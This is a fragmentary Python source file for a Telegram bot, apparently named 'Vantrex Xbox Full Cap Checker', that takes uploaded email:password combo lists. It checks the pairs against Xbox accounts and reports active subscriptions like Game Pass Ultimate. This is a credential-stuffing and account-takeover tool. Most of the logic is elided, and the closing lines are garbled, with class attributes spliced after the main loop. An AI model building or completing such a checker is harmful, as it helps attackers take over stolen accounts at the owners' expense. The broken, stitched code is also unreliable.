#!/usr/bin/env python3
"""
VANTREX XBOX FULL CAP CHECKER TELEGRAM BOT (FIXED)
"""

import os, re, sys, time, json, uuid, logging, threading
...
LANGUAGES = {
    'en': {
        'welcome': "🔥 **Welcome to Vantrex Xbox Checker Bot!**\n\nPlease select your language, then upload `.txt` combo.",
        'already_running': "❌ An active scan is already running.",
        'invalid_file': "❌ Please send only `.txt` files.",
        'read_error': "❌ Error reading file: ",
        'no_combo': "❌ No valid email:pass found.",
        'preparing': "⏳ Starting scan engine...",
    ...
    'tr': {
        'welcome': "🔥 **Vantrex Xbox Checker Bot'a Hoş Geldiniz!**\n\nDil seçin ve `.txt` combo dosyasını gönderin.",
        'already_running': "❌ Zaten tarama çalışıyor.",
        'invalid_file': "❌ Sadece `.txt` dosyası gönderin.",
        'read_error': "❌ Dosya okuma hatası: ",
        'no_combo': "❌ Geçerli email:pass bulunamadı.",
                ...
                if r6.status_code == 200:
                    ...
                    for item in data.get("items", []):
                        if item.get("status") == "Active":
                            ...
                            # Game Pass Ultimate, Xbox Live Gold, EA Play vb.
...
def handle_language_callback(call):
    ...
    user_languages[cid] = call.data.split('_')[1]
...
if __name__ == "__main__":
    print("[+] Vantrex Capture Engine (Fixed) Started.")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(5)        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
